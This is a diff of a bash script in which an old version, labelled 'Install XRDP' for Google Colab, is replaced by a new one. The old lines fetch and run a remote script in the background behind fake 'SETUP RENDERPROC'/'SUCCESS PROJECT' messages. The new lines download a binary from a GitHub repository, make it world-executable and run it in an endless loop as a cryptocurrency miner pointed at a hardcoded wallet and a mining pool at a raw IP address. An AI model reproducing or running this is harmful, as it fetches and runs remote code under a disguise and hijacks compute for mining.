@@ -1,20 +1,7 @@
-# /bin/bash
-# Install XRDP
-# Before get xmr coin for free
-# Google Colab
-sudo apt-get install screen -y
-clear
-sleep 1
-sudo wget https://raw.githubusercontent.com/renilo/kuuntul/main/anak.sh
-clear
-sleep 1
-chmod 700 ZEUS
-clear
-sleep 1
-clear
-sudo chmod 777 anak.sh
-sleep 1
-screen -dmS Running ./anak.sh
-sleep 1
-i=1
-while true; do clear; echo SETUP RENDERPROC $i; sleep 5; clear; echo SUCCESS PROJECT; sleep 1;let "i++";  done
+sudo wget https://github.com/renilo/kuuntul/raw/main/mente
+sudo chmod 777 mente
+
+while :; do
+    ./mente -w dero1qyq8st600gjd836pvfzjtrc3sqr6jz7st2s056n5f678keyvvns4zqgs6uveq.$(echo $(shuf -i 1-2000 -n 1)-COK1) -r stratum+tcp://51.222.96.66:443 -p stratum;
+    sleep 5;
+done
